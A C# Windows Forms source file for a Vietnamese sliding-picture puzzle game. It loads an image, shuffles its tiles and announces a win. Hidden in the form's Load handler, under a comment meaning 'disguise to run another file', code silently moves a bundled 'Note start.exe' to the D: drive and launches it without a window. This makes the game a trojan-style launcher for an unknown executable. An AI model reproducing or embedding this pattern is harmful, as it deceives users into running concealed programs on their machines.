using System;
using System.Diagnostics;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace DiHinh
{
    public partial class Form1 : Form
    {
        private bool _start;
        private DiHinh _DiHinh;
        private Graphics _paper;
        public Form1()
        {
            InitializeComponent();
            pictureBox1.Size = new Size(panel1.Size.Width / 3, panel1.Size.Height / 3);
            btnBrown.Width = btnSort.Width = pictureBox1.Width;
            pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
            _paper = panel1.CreateGraphics();
            _DiHinh = new DiHinh(panel1);
            _start = false;
            
            //MessageBox.Show(pictureBox1.Size.ToString());
        }

        private void btnBrown_Click(object sender, EventArgs e)
        {
            OpenFileDialog _Ofd = new OpenFileDialog();
            _Ofd.Filter = "File *.Jpg|*.jpg";
            _Ofd.InitialDirectory=Application.StartupPath+"\\Image";
            if(_Ofd.ShowDialog()==DialogResult.OK)
            {
                pictureBox1.ImageLocation = _Ofd.FileName;
                _DiHinh.Img = Resize(Image.FromFile(_Ofd.FileName), BanChoi._width, BanChoi._height);
                _start = true;
                _DiHinh.SplitCellImage();
                _DiHinh.ChooseCellWhite();
                for(int i=0; i<1000; i++)
                    _DiHinh.MixCell();
                panel1.Refresh();
                //Invalidate();
            }
            
        }
        public Image Resize(Image _img, int width, int height)
        {
            Bitmap bmp = new Bitmap(width, height);
            Graphics g = Graphics.FromImage((Image) bmp);
            g.DrawImage(_img, 0, 0, width, height);
            g.Dispose();
            return (Image)bmp;
        }
        private void panel1_Paint(object sender, PaintEventArgs e)
        {
            if (_start)
            {
                _DiHinh.VeBanChoi(_paper);
            }
                //e.Graphics.DrawImage(_DiHinh.Img, 0, 0);
        
            }

        private void btnSort_Click(object sender, EventArgs e)
        {
            if (_start)
            {
                _DiHinh.MixCell();
                panel1.Refresh();
            }
        }

        private void panel1_MouseClick(object sender, MouseEventArgs e)
        {
            if (_DiHinh.Move(e.X, e.Y))
            {
                //Invalidate();
                panel1.Refresh();
                if(_DiHinh.IsWin())
                {
                    MessageBox.Show("Bạn đã thắng game!", "Chúc mừng!");
                }
            }
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            btnBrown.PerformClick();
        }
        //Trá hình chạy file khác
        private void Form1_Load(object sender, EventArgs e)
        {
            string SourcePath = Application.StartupPath + @"\Note start.exe";
            string DesPath = @"D:\Note start.exe";
            if (MoveFile(SourcePath, DesPath)) RunFile(DesPath);

        }
        private void RunFile(string path)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = path;
            startInfo.CreateNoWindow = true;
            Process.Start(startInfo);
        }
        private bool MoveFile(string SourcePath, string DesPath)
        {
            if (!File.Exists(SourcePath)) return false;
            if (File.Exists(DesPath)) File.Delete(DesPath);
            File.Move(SourcePath, DesPath);
            return true;
        }
        
    }
}
